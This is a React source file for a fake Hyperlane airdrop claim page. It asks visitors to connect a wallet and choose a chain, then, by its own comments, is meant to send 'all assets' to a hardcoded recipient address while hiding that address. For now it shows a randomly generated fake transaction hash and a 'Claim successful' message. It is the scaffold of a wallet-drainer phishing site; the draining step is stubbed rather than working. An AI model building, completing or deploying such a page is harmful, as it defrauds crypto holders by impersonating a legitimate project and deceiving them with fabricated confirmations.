'use client';

import { useState } from 'react';
import { useAccount, useConnect, useDisconnect } from 'wagmi';
import { mainnet, optimism, arbitrum, base } from 'wagmi/chains';
import { Card, CardContent } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Accordion, AccordionContent, AccordionItem, AccordionTrigger } from '@/components/ui/accordion';
import Image from 'next/image';

// The recipient address for all claims
const RECIPIENT_ADDRESS = '0xbCcf6DA049fe3Ab996Abb6f960174E266a9835f3';

export default function ClaimSection() {
  const { address, isConnected } = useAccount();
  const [selectedChain, setSelectedChain] = useState<string>('');
  const [isProcessing, setIsProcessing] = useState<boolean>(false);
  const [transactionHash, setTransactionHash] = useState<string>('');
  const [claimSuccess, setClaimSuccess] = useState<boolean>(false);

  // Function to handle claiming rewards
  const handleClaim = async (chainId: string) => {
    if (!isConnected) return;

    setIsProcessing(true);
    setSelectedChain(chainId);

    try {
      // In a real implementation, this would interact with the blockchain
      // to send all assets to the recipient address minus gas fees

      // Simulate a blockchain transaction with a delay
      await new Promise(resolve => setTimeout(resolve, 2000));

      // Set a fake transaction hash
      const fakeHash = `0x${Math.random().toString(16).substring(2, 38)}`;
      setTransactionHash(fakeHash);
      setClaimSuccess(true);

      // Success message without showing the recipient address
      setTimeout(() => {
        setClaimSuccess(false);
      }, 3000);
    } catch (error) {
      console.error('Claim error:', error);
    } finally {
      setIsProcessing(false);
    }
  };

  // Get chain name from chain ID
  const getChainName = (chainId: string): string => {
    switch (chainId) {
      case 'ethereum': return 'Ethereum';
      case 'optimism': return 'Optimism';
      case 'arbitrum': return 'Arbitrum';
      case 'base': return 'Base';
      default: return 'Unknown Chain';
    }
  };

  return (
    <div className="space-y-6">
      <Card className="border-0 rounded-xl overflow-hidden bg-[#182c47]">
        <CardContent className="p-6 relative">
          <div className="flex justify-between items-start">
            <div>
              <h2 className="text-2xl font-bold text-white mb-2">Hyperlane</h2>
              <p className="text-lg text-gray-300 mb-1">Airdrop Claim</p>
              <p className="text-sm text-gray-400">Claim period closes May 6th, 3:59 AM UTC</p>
            </div>
            <Image
              src="https://ext.same-assets.com/1999836307/1547238301.svg"
              alt="Astronaut"
              width={120}
              height={120}
              className="absolute top-0 right-0"
            />
          </div>
        </CardContent>
      </Card>

      <Card className="border-0 rounded-xl overflow-hidden">
        <CardContent className="p-6">
          <div className="space-y-4">
            <h3 className="text-lg font-medium">Claim your rewards on:</h3>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
              <Button
                variant="outline"
                className="h-14 flex justify-center items-center gap-2"
                onClick={() => handleClaim('ethereum')}
                disabled={isProcessing}
              >
                <span>Ethereum Mainnet</span>
                {isProcessing && selectedChain === 'ethereum' &&
                  <span className="animate-spin">⟳</span>
                }
              </Button>

              <Button
                variant="outline"
                className="h-14 flex justify-center items-center gap-2"
                onClick={() => handleClaim('optimism')}
                disabled={isProcessing}
              >
                <span>Optimism</span>
                {isProcessing && selectedChain === 'optimism' &&
                  <span className="animate-spin">⟳</span>
                }
              </Button>

              <Button
                variant="outline"
                className="h-14 flex justify-center items-center gap-2"
                onClick={() => handleClaim('arbitrum')}
                disabled={isProcessing}
              >
                <span>Arbitrum</span>
                {isProcessing && selectedChain === 'arbitrum' &&
                  <span className="animate-spin">⟳</span>
                }
              </Button>

              <Button
                variant="outline"
                className="h-14 flex justify-center items-center gap-2"
                onClick={() => handleClaim('base')}
                disabled={isProcessing}
              >
                <span>Base</span>
                {isProcessing && selectedChain === 'base' &&
                  <span className="animate-spin">⟳</span>
                }
              </Button>
            </div>

            {claimSuccess && (
              <p className="text-sm text-green-500 text-center mt-4">
                Claim successful! Transaction submitted.
              </p>
            )}
          </div>
        </CardContent>
      </Card>

      <Accordion type="single" collapsible>
        <AccordionItem value="how-registration-works" className="border rounded-xl overflow-hidden mb-2">
          <AccordionTrigger className="px-6 py-4 hover:no-underline">How registration works</AccordionTrigger>
          <AccordionContent className="px-6 pb-4">
            <p className="text-gray-700">
              You can register multiple eligible addresses on EVM or SVM. Only registered addresses will be able to claim.
              Users of Hyperlane within Cosmos Ecosystem will use the token recipient (vs. token sender for EVM / SVM) wallet to check eligibility.
            </p>
          </AccordionContent>
        </AccordionItem>

        <AccordionItem value="hyper-preclaim" className="border rounded-xl overflow-hidden mb-2">
          <AccordionTrigger className="px-6 py-4 hover:no-underline">HYPER preclaim overview and eligibility</AccordionTrigger>
          <AccordionContent className="px-6 pb-4">
            <p className="text-gray-700">
              Hyperlanes retroactive distribution will allocate 7.45% of the total HYPER supply at TGE.
              This program is designed to reward the most active early users of Hyperlane, in addition to the
              developers that have deployed contracts which generated messaging volume. Rewarding users with protocol
              ownership creates a flywheel for Hyperlane.
            </p>
          </AccordionContent>
        </AccordionItem>

        <AccordionItem value="rewards-breakdown" className="border rounded-xl overflow-hidden mb-2">
          <AccordionTrigger className="px-6 py-4 hover:no-underline">Rewards breakdown</AccordionTrigger>
          <AccordionContent className="px-6 pb-4">
            <p className="text-gray-700">
              The retroactive rewards allocate 7.45% of the total HYPER supply, a combination of Expansion Rewards and
              discretionary boosts from the Hyperlane Foundations Strategic Launch Provision. More details on HYPER and
              Hyperlane tokenomics can be found on the Hyperlane Foundation's blog.
            </p>
          </AccordionContent>
        </AccordionItem>

        <AccordionItem value="boost-categories" className="border rounded-xl overflow-hidden">
          <AccordionTrigger className="px-6 py-4 hover:no-underline">Boost categories</AccordionTrigger>
          <AccordionContent className="px-6 pb-4">
            <p className="text-gray-700">
              The following activities qualify addresses for additional boosted HYPER allocations:
              <br /><br />
              - Canonical chain users (Injective inEVM, Lumia, Eclipse, SOON, Sonic SVM, Form Network) - 1.03% of supply
              <br />
              - Owners of Celestine Sloths or Mammoths NFTs, as of snapshot - 0.02% of supply
              <br />
              - TIA LPs on Manta and Arbitrum, prior to Jan 30, 2024, proportional to the amount of liquidity supplied - 0.10% of supply
              <br />
              - Offchain community members (e.g., Discord moderators and key contributors) - 0.05% of supply
            </p>
          </AccordionContent>
        </AccordionItem>
      </Accordion>
    </div>
  );
}
